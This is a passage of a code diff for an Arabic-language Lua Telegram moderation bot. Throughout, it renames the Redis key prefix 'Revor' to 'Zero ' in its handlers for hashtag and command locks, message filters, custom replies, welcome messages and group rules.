 if text and text:match("#[%a%d_]+") and not msg.Distinguished then 
-local Hashtak_Group = Redis:get(Revor.."Revor:Lock:hashtak"..msg_chat_id)
+local Hashtak_Group = Redis:get(Zero .."Zero :Lock:hashtak"..msg_chat_id)
 if Hashtak_Group == "del" then
 return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 elseif Hashtak_Group == "ked" then
 return LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 elseif Hashtak_Group == "ktm" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 elseif Hashtak_Group == "kick" then
 return LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 end
 print('This is hashtak ')
 end
 if text and text:match("/[%a%d_]+") and not msg.Distinguished then 
-local comd_Group = Redis:get(Revor.."Revor:Lock:Cmd"..msg_chat_id)
+local comd_Group = Redis:get(Zero .."Zero :Lock:Cmd"..msg_chat_id)
 if comd_Group == "del" then
 return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 elseif comd_Group == "ked" then
 return LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
 elseif comd_Group == "ktm" then
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
 elseif comd_Group == "kick" then
 return LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
 end
 end
-if (Redis:get(Revor..'Revor:FilterText'..msg_chat_id..':'..msg.sender.user_id) == 'true') then
+if (Redis:get(Zero ..'Zero :FilterText'..msg_chat_id..':'..msg.sender.user_id) == 'true') then
 if text or msg.content.photo or msg.content.animation or msg.content.sticker then
 if msg.content.photo then
 Filters = 'صوره'
-Redis:sadd(Revor.."Revor:List:Filter"..msg_chat_id,'photo:'..msg.content.photo.sizes[1].photo.id)  
-Redis:set(Revor.."Revor:Filter:Text"..msg.sender.user_id..':'..msg_chat_id, msg.content.photo.sizes[1].photo.id)  
+Redis:sadd(Zero .."Zero :List:Filter"..msg_chat_id,'photo:'..msg.content.photo.sizes[1].photo.id)  
+Redis:set(Zero .."Zero :Filter:Text"..msg.sender.user_id..':'..msg_chat_id, msg.content.photo.sizes[1].photo.id)  
 elseif msg.content.animation then
 Filters = 'متحركه'
-Redis:sadd(Revor.."Revor:List:Filter"..msg_chat_id,'animation:'..msg.content.animation.animation.id)  
-Redis:set(Revor.."Revor:Filter:Text"..msg.sender.user_id..':'..msg_chat_id, msg.content.animation.animation.id)  
+Redis:sadd(Zero .."Zero :List:Filter"..msg_chat_id,'animation:'..msg.content.animation.animation.id)  
+Redis:set(Zero .."Zero :Filter:Text"..msg.sender.user_id..':'..msg_chat_id, msg.content.animation.animation.id)  
 elseif msg.content.sticker then
 Filters = 'ملصق'
-Redis:sadd(Revor.."Revor:List:Filter"..msg_chat_id,'sticker:'..msg.content.sticker.sticker.id)  
-Redis:set(Revor.."Revor:Filter:Text"..msg.sender.user_id..':'..msg_chat_id, msg.content.sticker.sticker.id)  
+Redis:sadd(Zero .."Zero :List:Filter"..msg_chat_id,'sticker:'..msg.content.sticker.sticker.id)  
+Redis:set(Zero .."Zero :Filter:Text"..msg.sender.user_id..':'..msg_chat_id, msg.content.sticker.sticker.id)  
 elseif text then
-Redis:set(Revor.."Revor:Filter:Text"..msg.sender.user_id..':'..msg_chat_id, text)  
-Redis:sadd(Revor.."Revor:List:Filter"..msg_chat_id,'text:'..text)  
+Redis:set(Zero .."Zero :Filter:Text"..msg.sender.user_id..':'..msg_chat_id, text)  
+Redis:sadd(Zero .."Zero :List:Filter"..msg_chat_id,'text:'..text)  
 Filters = 'نص'
 end
-Redis:set(Revor..'Revor:FilterText'..msg_chat_id..':'..msg.sender.user_id,'true1')
+Redis:set(Zero ..'Zero :FilterText'..msg_chat_id..':'..msg.sender.user_id,'true1')
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙ارسل تحذير ( "..Filters.." ) عند ارساله","md",true)  
 end
 end
-if text and (Redis:get(Revor..'Revor:FilterText'..msg_chat_id..':'..msg.sender.user_id) == 'true1') then
-local Text_Filter = Redis:get(Revor.."Revor:Filter:Text"..msg.sender.user_id..':'..msg_chat_id)  
+if text and (Redis:get(Zero ..'Zero :FilterText'..msg_chat_id..':'..msg.sender.user_id) == 'true1') then
+local Text_Filter = Redis:get(Zero .."Zero :Filter:Text"..msg.sender.user_id..':'..msg_chat_id)  
 if Text_Filter then   
-Redis:set(Revor.."Revor:Filter:Group:"..Text_Filter..msg_chat_id,text)  
+Redis:set(Zero .."Zero :Filter:Group:"..Text_Filter..msg_chat_id,text)  
 end  
-Redis:del(Revor.."Revor:Filter:Text"..msg.sender.user_id..':'..msg_chat_id)  
-Redis:del(Revor..'Revor:FilterText'..msg_chat_id..':'..msg.sender.user_id)
+Redis:del(Zero .."Zero :Filter:Text"..msg.sender.user_id..':'..msg_chat_id)  
+Redis:del(Zero ..'Zero :FilterText'..msg_chat_id..':'..msg.sender.user_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙تم اضافه رد التحذير","md",true)  
 end
-if text and (Redis:get(Revor..'Revor:FilterText'..msg_chat_id..':'..msg.sender.user_id) == 'DelFilter') then   
+if text and (Redis:get(Zero ..'Zero :FilterText'..msg_chat_id..':'..msg.sender.user_id) == 'DelFilter') then   
 if text or msg.content.photo or msg.content.animation or msg.content.sticker then
 if msg.content.photo then
 Filters = 'الصوره'
-Redis:srem(Revor.."Revor:List:Filter"..msg_chat_id,'photo:'..msg.content.photo.sizes[1].photo.id)  
-Redis:del(Revor.."Revor:Filter:Group:"..msg.content.photo.sizes[1].photo.id..msg_chat_id)  
+Redis:srem(Zero .."Zero :List:Filter"..msg_chat_id,'photo:'..msg.content.photo.sizes[1].photo.id)  
+Redis:del(Zero .."Zero :Filter:Group:"..msg.content.photo.sizes[1].photo.id..msg_chat_id)  
 elseif msg.content.animation then
 Filters = 'المتحركه'
-Redis:srem(Revor.."Revor:List:Filter"..msg_chat_id,'animation:'..msg.content.animation.animation.id)  
-Redis:del(Revor.."Revor:Filter:Group:"..msg.content.animation.animation.id..msg_chat_id)  
+Redis:srem(Zero .."Zero :List:Filter"..msg_chat_id,'animation:'..msg.content.animation.animation.id)  
+Redis:del(Zero .."Zero :Filter:Group:"..msg.content.animation.animation.id..msg_chat_id)  
 elseif msg.content.sticker then
 Filters = 'الملصق'
-Redis:srem(Revor.."Revor:List:Filter"..msg_chat_id,'sticker:'..msg.content.sticker.sticker.id)  
-Redis:del(Revor.."Revor:Filter:Group:"..msg.content.sticker.sticker.id..msg_chat_id)  
+Redis:srem(Zero .."Zero :List:Filter"..msg_chat_id,'sticker:'..msg.content.sticker.sticker.id)  
+Redis:del(Zero .."Zero :Filter:Group:"..msg.content.sticker.sticker.id..msg_chat_id)  
 elseif text then
-Redis:srem(Revor.."Revor:List:Filter"..msg_chat_id,'text:'..text)  
-Redis:del(Revor.."Revor:Filter:Group:"..text..msg_chat_id)  
+Redis:srem(Zero .."Zero :List:Filter"..msg_chat_id,'text:'..text)  
+Redis:del(Zero .."Zero :Filter:Group:"..text..msg_chat_id)  
 Filters = 'النص'
 end
-Redis:del(Revor..'Revor:FilterText'..msg_chat_id..':'..msg.sender.user_id)
+Redis:del(Zero ..'Zero :FilterText'..msg_chat_id..':'..msg.sender.user_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم الغاء منع ("..Filters..")","md",true)  
 end
 end
@@ -1417,138 +1420,138 @@ elseif text then
 DelFilters = text
 statusfilter = 'الرساله'
 end
-local ReplyFilters = Redis:get(Revor.."Revor:Filter:Group:"..DelFilters..msg_chat_id)
+local ReplyFilters = Redis:get(Zero .."Zero :Filter:Group:"..DelFilters..msg_chat_id)
 if ReplyFilters and not msg.Developers then
 LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙لقد تم منع هذه ( "..statusfilter.." ) هنا*\n⌔︙"..ReplyFilters,"md",true)   
 end
 end
-if text and Redis:get(Revor.."Revor:All:Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id) == "true" then
-local NewCmmd = Redis:get(Revor.."Revor:All:Get:Reides:Commands:Group"..text)
+if text and Redis:get(Zero .."Zero :All:Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id) == "true" then
+local NewCmmd = Redis:get(Zero .."Zero :All:Get:Reides:Commands:Group"..text)
 if NewCmmd then
-Redis:del(Revor.."Revor:All:Get:Reides:Commands:Group"..text)
-Redis:del(Revor.."Revor:All:Command:Reids:Group:New"..msg_chat_id)
-Redis:srem(Revor.."Revor:All:Command:List:Group",text)
+Redis:del(Zero .."Zero :All:Get:Reides:Commands:Group"..text)
+Redis:del(Zero .."Zero :All:Command:Reids:Group:New"..msg_chat_id)
+Redis:srem(Zero .."Zero :All:Command:List:Group",text)
 LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم ازالة هاذا ← { "..text.." }","md",true)
 else
 LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد امر بهاذا الاسم","md",true)
 end
-Redis:del(Revor.."Revor:All:Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id)
+Redis:del(Zero .."Zero :All:Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id)
 return false
 end
-if text and Redis:get(Revor.."Revor:All:Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id) == "true" then
-Redis:set(Revor.."Revor:All:Command:Reids:Group:New"..msg_chat_id,text)
-Redis:del(Revor.."Revor:All:Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id)
-Redis:set(Revor.."Revor:All:Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id,"true1") 
+if text and Redis:get(Zero .."Zero :All:Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id) == "true" then
+Redis:set(Zero .."Zero :All:Command:Reids:Group:New"..msg_chat_id,text)
+Redis:del(Zero .."Zero :All:Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id)
+Redis:set(Zero .."Zero :All:Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id,"true1") 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل الامر الجديد ليتم وضعه مكان القديم","md",true)  
 end
-if text and Redis:get(Revor.."Revor:All:Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id) == "true1" then
-local NewCmd = Redis:get(Revor.."Revor:All:Command:Reids:Group:New"..msg_chat_id)
-Redis:set(Revor.."Revor:All:Get:Reides:Commands:Group"..text,NewCmd)
-Redis:sadd(Revor.."Revor:All:Command:List:Group",text)
-Redis:del(Revor.."Revor:All:Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id)
+if text and Redis:get(Zero .."Zero :All:Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id) == "true1" then
+local NewCmd = Redis:get(Zero .."Zero :All:Command:Reids:Group:New"..msg_chat_id)
+Redis:set(Zero .."Zero :All:Get:Reides:Commands:Group"..text,NewCmd)
+Redis:sadd(Zero .."Zero :All:Command:List:Group",text)
+Redis:del(Zero .."Zero :All:Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حفظ الامر باسم ← { "..text..' }',"md",true)
 end
 
-if text and Redis:get(Revor.."Revor:Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id) == "true" then
-local NewCmmd = Redis:get(Revor.."Revor:Get:Reides:Commands:Group"..msg_chat_id..":"..text)
+if text and Redis:get(Zero .."Zero :Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id) == "true" then
+local NewCmmd = Redis:get(Zero .."Zero :Get:Reides:Commands:Group"..msg_chat_id..":"..text)
 if NewCmmd then
-Redis:del(Revor.."Revor:Get:Reides:Commands:Group"..msg_chat_id..":"..text)
-Redis:del(Revor.."Revor:Command:Reids:Group:New"..msg_chat_id)
-Redis:srem(Revor.."Revor:Command:List:Group"..msg_chat_id,text)
+Redis:del(Zero .."Zero :Get:Reides:Commands:Group"..msg_chat_id..":"..text)
+Redis:del(Zero .."Zero :Command:Reids:Group:New"..msg_chat_id)
+Redis:srem(Zero .."Zero :Command:List:Group"..msg_chat_id,text)
 LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم ازالة هاذا ← { "..text.." }","md",true)
 else
 LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد امر بهاذا الاسم","md",true)
 end
-Redis:del(Revor.."Revor:Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id)
+Redis:del(Zero .."Zero :Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id)
 return false
 end
-if text and Redis:get(Revor.."Revor:Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id) == "true" then
-Redis:set(Revor.."Revor:Command:Reids:Group:New"..msg_chat_id,text)
-Redis:del(Revor.."Revor:Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id)
-Redis:set(Revor.."Revor:Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id,"true1") 
+if text and Redis:get(Zero .."Zero :Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id) == "true" then
+Redis:set(Zero .."Zero :Command:Reids:Group:New"..msg_chat_id,text)
+Redis:del(Zero .."Zero :Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id)
+Redis:set(Zero .."Zero :Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id,"true1") 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل الامر الجديد ليتم وضعه مكان القديم","md",true)  
 end
-if text and Redis:get(Revor.."Revor:Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id) == "true1" then
-local NewCmd = Redis:get(Revor.."Revor:Command:Reids:Group:New"..msg_chat_id)
-Redis:set(Revor.."Revor:Get:Reides:Commands:Group"..msg_chat_id..":"..text,NewCmd)
-Redis:sadd(Revor.."Revor:Command:List:Group"..msg_chat_id,text)
-Redis:del(Revor.."Revor:Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id)
+if text and Redis:get(Zero .."Zero :Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id) == "true1" then
+local NewCmd = Redis:get(Zero .."Zero :Command:Reids:Group:New"..msg_chat_id)
+Redis:set(Zero .."Zero :Get:Reides:Commands:Group"..msg_chat_id..":"..text,NewCmd)
+Redis:sadd(Zero .."Zero :Command:List:Group"..msg_chat_id,text)
+Redis:del(Zero .."Zero :Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حفظ الامر باسم ← { "..text..' }',"md",true)
 end
-if Redis:get(Revor.."Revor:Set:Link"..msg_chat_id..""..msg.sender.user_id) then
+if Redis:get(Zero .."Zero :Set:Link"..msg_chat_id..""..msg.sender.user_id) then
 if text == "الغاء" then
-Redis:del(Revor.."Revor:Set:Link"..msg_chat_id..""..msg.sender.user_id) 
+Redis:del(Zero .."Zero :Set:Link"..msg_chat_id..""..msg.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"📥︙تم الغاء حفظ الرابط","md",true)         
 end
 if text and text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)") then     
 local LinkGroup = text:match("(https://telegram.me/joinchat/%S+)") or text:match("(https://t.me/joinchat/%S+)")   
-Redis:set(Revor.."Revor:Group:Link"..msg_chat_id,LinkGroup)
-Redis:del(Revor.."Revor:Set:Link"..msg_chat_id..""..msg.sender.user_id) 
+Redis:set(Zero .."Zero :Group:Link"..msg_chat_id,LinkGroup)
+Redis:del(Zero .."Zero :Set:Link"..msg_chat_id..""..msg.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"📥︙تم حفظ الرابط بنجاح","md",true)         
 end
 end 
-if Redis:get(Revor.."Tshake:Welcome:Group" .. msg_chat_id .. "" .. msg.sender.user_id) then 
+if Redis:get(Zero .."Tshake:Welcome:Group" .. msg_chat_id .. "" .. msg.sender.user_id) then 
 if text == "الغاء" then 
-Redis:del(Revor.."Tshake:Welcome:Group" .. msg_chat_id .. "" .. msg.sender.user_id)  
+Redis:del(Zero .."Tshake:Welcome:Group" .. msg_chat_id .. "" .. msg.sender.user_id)  
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم الغاء حفظ الترحيب","md",true)   
 end 
-Redis:del(Revor.."Tshake:Welcome:Group" .. msg_chat_id .. "" .. msg.sender.user_id)  
-Redis:set(Revor.."Revor:Welcome:Group"..msg_chat_id,text) 
+Redis:del(Zero .."Tshake:Welcome:Group" .. msg_chat_id .. "" .. msg.sender.user_id)  
+Redis:set(Zero .."Zero :Welcome:Group"..msg_chat_id,text) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حفظ ترحيب المجموعه","md",true)     
 end
-if Redis:get(Revor.."Revor:Set:Rules:" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
+if Redis:get(Zero .."Zero :Set:Rules:" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
 if text == "الغاء" then 
-Redis:del(Revor.."Revor:Set:Rules:" .. msg_chat_id .. ":" .. msg.sender.user_id)
+Redis:del(Zero .."Zero :Set:Rules:" .. msg_chat_id .. ":" .. msg.sender.user_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم الغاء حفظ القوانين","md",true)   
 end 
-Redis:set(Revor.."Revor:Group:Rules" .. msg_chat_id,text) 
-Redis:del(Revor.."Revor:Set:Rules:" .. msg_chat_id .. ":" .. msg.sender.user_id)
+Redis:set(Zero .."Zero :Group:Rules" .. msg_chat_id,text) 
+Redis:del(Zero .."Zero :Set:Rules:" .. msg_chat_id .. ":" .. msg.sender.user_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حفظ قوانين المجموعه","md",true)  
 end  
-if Redis:get(Revor.."Revor:Set:Description:" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
+if Redis:get(Zero .."Zero :Set:Description:" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
 if text == "الغاء" then 
-Redis:del(Revor.."Revor:Set:Description:" .. msg_chat_id .. ":" .. msg.sender.user_id)
+Redis:del(Zero .."Zero :Set:Description:" .. msg_chat_id .. ":" .. msg.sender.user_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم الغاء حفظ وصف المجموعه","md",true)   
 end 
 LuaTele.setChatDescription(msg_chat_id,text) 
-Redis:del(Revor.."Revor:Set:Description:" .. msg_chat_id .. ":" .. msg.sender.user_id)
+Redis:del(Zero .."Zero :Set:Description:" .. msg_chat_id .. ":" .. msg.sender.user_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حفظ وصف المجموعه","md",true)  
 end  
 if text  then
-local test = Redis:get(Revor.."Revor:Text:Manager"..msg.sender.user_id..":"..msg_chat_id.."")
-if Redis:get(Revor.."Revor:Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id) == "true1" then
-Redis:del(Revor.."Revor:Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id)
+local test = Redis:get(Zero .."Zero :Text:Manager"..msg.sender.user_id..":"..msg_chat_id.."")
+if Redis:get(Zero .."Zero :Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id) == "true1" then
+Redis:del(Zero .."Zero :Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id)
 if msg.content.sticker then   
-Redis:set(Revor.."Revor:Add:Rd:Manager:Stekrs"..test..msg_chat_id, msg.content.sticker.sticker.remote.id)  
+Redis:set(Zero .."Zero :Add:Rd:Manager:Stekrs"..test..msg_chat_id, msg.content.sticker.sticker.remote.id)  
 end   
 if msg.content.voice_note then  
-Redis:set(Revor.."Revor:Add:Rd:Manager:Vico"..test..msg_chat_id, msg.content.voice_note.voice.remote.id)  
+Redis:set(Zero .."Zero :Add:Rd:Manager:Vico"..test..msg_chat_id, msg.content.voice_note.voice.remote.id)  
 end   
 if text then   
 text = text:gsub('"',"") 
 text = text:gsub('"',"") 
 text = text:gsub("`","") 
 text = text:gsub("*","") 
-Redis:set(Revor.."Revor:Add:Rd:Manager:Text"..test..msg_chat_id, text)  
+Redis:set(Zero .."Zero :Add:Rd:Manager:Text"..test..msg_chat_id, text)  
 end  
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حفظ رد للمدير بنجاح \n⌔︙ارسل ( "..test.." ) لرئية الرد","md",true)  
 end  
 end
 if text and text:match("^(.*)$") then
-if Redis:get(Revor.."Revor:Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id) == "true" then
-Redis:set(Revor.."Revor:Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id,"true1")
-Redis:set(Revor.."Revor:Text:Manager"..msg.sender.user_id..":"..msg_chat_id, text)
-Redis:del(Revor.."Revor:Add:Rd:Manager:Gif"..text..msg_chat_id)   
-Redis:del(Revor.."Revor:Add:Rd:Manager:Vico"..text..msg_chat_id)   
-Redis:del(Revor.."Revor:Add:Rd:Manager:Stekrs"..text..msg_chat_id)     
-Redis:del(Revor.."Revor:Add:Rd:Manager:Text"..text..msg_chat_id)   
-Redis:del(Revor.."Revor:Add:Rd:Manager:Photo"..text..msg_chat_id)
-Redis:del(Revor.."Revor:Add:Rd:Manager:Video"..text..msg_chat_id)
-Redis:del(Revor.."Revor:Add:Rd:Manager:File"..text..msg_chat_id)
-Redis:del(Revor.."Revor:Add:Rd:Manager:video_note"..text..msg_chat_id)
-Redis:del(Revor.."Revor:Add:Rd:Manager:Audio"..text..msg_chat_id)
-Redis:sadd(Revor.."Revor:List:Manager"..msg_chat_id.."", text)
+if Redis:get(Zero .."Zero :Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id) == "true" then
+Redis:set(Zero .."Zero :Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id,"true1")
+Redis:set(Zero .."Zero :Text:Manager"..msg.sender.user_id..":"..msg_chat_id, text)
+Redis:del(Zero .."Zero :Add:Rd:Manager:Gif"..text..msg_chat_id)   
+Redis:del(Zero .."Zero :Add:Rd:Manager:Vico"..text..msg_chat_id)   
+Redis:del(Zero .."Zero :Add:Rd:Manager:Stekrs"..text..msg_chat_id)     
+Redis:del(Zero .."Zero :Add:Rd:Manager:Text"..text..msg_chat_id)   
+Redis:del(Zero .."Zero :Add:Rd:Manager:Photo"..text..msg_chat_id)
+Redis:del(Zero .."Zero :Add:Rd:Manager:Video"..text..msg_chat_id)
+Redis:del(Zero .."Zero :Add:Rd:Manager:File"..text..msg_chat_id)
+Redis:del(Zero .."Zero :Add:Rd:Manager:video_note"..text..msg_chat_id)
+Redis:del(Zero .."Zero :Add:Rd:Manager:Audio"..text..msg_chat_id)
+Redis:sadd(Zero .."Zero :List:Manager"..msg_chat_id.."", text)
 LuaTele.sendText(msg_chat_id,msg_id,[[
 ↯︙ارسل لي الرد سواء كان 
 ❨ ملف • ملصق • متحركه • صوره
@@ -1567,38 +1570,38 @@ return false
 end
 end
 if text and text:match("^(.*)$") then
-if Redis:get(Revor.."Revor:Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id.."") == "true2" then
-Redis:del(Revor.."Revor:Add:Rd:Manager:Gif"..text..msg_chat_id)   
-Redis:del(Revor.."Revor:Add:Rd:Manager:Vico"..text..msg_chat_id)   
-Redis:del(Revor.."Revor:Add:Rd:Manager:Stekrs"..text..msg_chat_id)     
-Redis:del(Revor.."Revor:Add:Rd:Manager:Text"..text..msg_chat_id)   
-Redis:del(Revor.."Revor:Add:Rd:Manager:Photo"..text..msg_chat_id)
-Redis:del(Revor.."Revor:Add:Rd:Manager:Video"..text..msg_chat_id)
-Redis:del(Revor.."Revor:Add:Rd:Manager:File"..text..msg_chat_id)
-Redis:del(Revor.."Revor:Add:Rd:Manager:Audio"..text..msg_chat_id)
-Redis:del(Revor.."Revor:Add:Rd:Manager:video_note"..text..msg_chat_id)
-Redis:del(Revor.."Revor:Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id)
-Redis:srem(Revor.."Revor:List:Manager"..msg_chat_id.."", text)
+if Redis:get(Zero .."Zero :Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id.."") == "true2" then
+Redis:del(Zero .."Zero :Add:Rd:Manager:Gif"..text..msg_chat_id)   
+Redis:del(Zero .."Zero :Add:Rd:Manager:Vico"..text..msg_chat_id)   
+Redis:del(Zero .."Zero :Add:Rd:Manager:Stekrs"..text..msg_chat_id)     
+Redis:del(Zero .."Zero :Add:Rd:Manager:Text"..text..msg_chat_id)   
+Redis:del(Zero .."Zero :Add:Rd:Manager:Photo"..text..msg_chat_id)
+Redis:del(Zero .."Zero :Add:Rd:Manager:Video"..text..msg_chat_id)
+Redis:del(Zero .."Zero :Add:Rd:Manager:File"..text..msg_chat_id)
+Redis:del(Zero .."Zero :Add:Rd:Manager:Audio"..text..msg_chat_id)
+Redis:del(Zero .."Zero :Add:Rd:Manager:video_note"..text..msg_chat_id)
+Redis:del(Zero .."Zero :Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id)
+Redis:srem(Zero .."Zero :List:Manager"..msg_chat_id.."", text)
 LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حذف الرد من ردود المدير ","md",true)  
 return false
 end
 end
-if text and Redis:get(Revor.."Revor:Status:ReplySudo"..msg_chat_id) then
-local anemi = Redis:get(Revor.."Revor:Add:Rd:Sudo:Gif"..text)   
-local veico = Redis:get(Revor.."Revor:Add:Rd:Sudo:vico"..text)   
-local stekr = Redis:get(Revor.."Revor:Add:Rd:Sudo:stekr"..text)     
-local Text = Redis:get(Revor.."Revor:Add:Rd:Sudo:Text"..text)   
-local photo = Redis:get(Revor.."Revor:Add:Rd:Sudo:Photo"..text)
-local video = Redis:get(Revor.."Revor:Add:Rd:Sudo:Video"..text)
-local document = Redis:get(Revor.."Revor:Add:Rd:Sudo:File"..text)
-local audio = Redis:get(Revor.."Revor:Add:Rd:Sudo:Audio"..text)
-local video_note = Redis:get(Revor.."Revor:Add:Rd:Sudo:video_note"..text)
+if text and Redis:get(Zero .."Zero :Status:ReplySudo"..msg_chat_id) then
+local anemi = Redis:get(Zero .."Zero :Add:Rd:Sudo:Gif"..text)   
+local veico = Redis:get(Zero .."Zero :Add:Rd:Sudo:vico"..text)   
+local stekr = Redis:get(Zero .."Zero :Add:Rd:Sudo:stekr"..text)     
+local Text = Redis:get(Zero .."Zero :Add:Rd:Sudo:Text"..text)   
+local photo = Redis:get(Zero .."Zero :Add:Rd:Sudo:Photo"..text)
+local video = Redis:get(Zero .."Zero :Add:Rd:Sudo:Video"..text)
+local document = Redis:get(Zero .."Zero :Add:Rd:Sudo:File"..text)
+local audio = Redis:get(Zero .."Zero :Add:Rd:Sudo:Audio"..text)
+local video_note = Redis:get(Zero .."Zero :Add:Rd:Sudo:video_note"..text)
 if Text then 
 local UserInfo = LuaTele.getUser(msg.sender.user_id)
-local NumMsg = Redis:get(Revor..'Revor:Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
+local NumMsg = Redis:get(Zero ..'Zero :Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
 local TotalMsg = Total_message(NumMsg)
 local Status_Gps = msg.Name_Controller
-local NumMessageEdit = Redis:get(Revor..'Revor:Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
+local NumMessageEdit = Redis:get(Zero ..'Zero :Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
 local Text = Text:gsub('#username',(UserInfo.username or 'لا يوجد')) 
 local Text = Text:gsub('#name',UserInfo.first_name)
 local Text = Text:gsub('#id',msg.sender.user_id)
@@ -1632,22 +1635,22 @@ if audio then
 LuaTele.sendAudio(msg_chat_id, msg.id, audio, '', "md") 
 end
 end
-if text and Redis:get(Revor.."Revor:Status:Reply"..msg_chat_id) then
-local anemi = Redis:get(Revor.."Revor:Add:Rd:Manager:Gif"..text..msg_chat_id)   
-local veico = Redis:get(Revor.."Revor:Add:Rd:Manager:Vico"..text..msg_chat_id)   
-local stekr = Redis:get(Revor.."Revor:Add:Rd:Manager:Stekrs"..text..msg_chat_id)     
-local Texingt = Redis:get(Revor.."Revor:Add:Rd:Manager:Text"..text..msg_chat_id)   
-local photo = Redis:get(Revor.."Revor:Add:Rd:Manager:Photo"..text..msg_chat_id)
-local video = Redis:get(Revor.."Revor:Add:Rd:Manager:Video"..text..msg_chat_id)
-local document = Redis:get(Revor.."Revor:Add:Rd:Manager:File"..text..msg_chat_id)
-local audio = Redis:get(Revor.."Revor:Add:Rd:Manager:Audio"..text..msg_chat_id)
-local video_note = Redis:get(Revor.."Revor:Add:Rd:Manager:video_note"..text..msg_chat_id)
+if text and Redis:get(Zero .."Zero :Status:Reply"..msg_chat_id) then
+local anemi = Redis:get(Zero .."Zero :Add:Rd:Manager:Gif"..text..msg_chat_id)   
+local veico = Redis:get(Zero .."Zero :Add:Rd:Manager:Vico"..text..msg_chat_id)   
+local stekr = Redis:get(Zero .."Zero :Add:Rd:Manager:Stekrs"..text..msg_chat_id)     
+local Texingt = Redis:get(Zero .."Zero :Add:Rd:Manager:Text"..text..msg_chat_id)   
+local photo = Redis:get(Zero .."Zero :Add:Rd:Manager:Photo"..text..msg_chat_id)
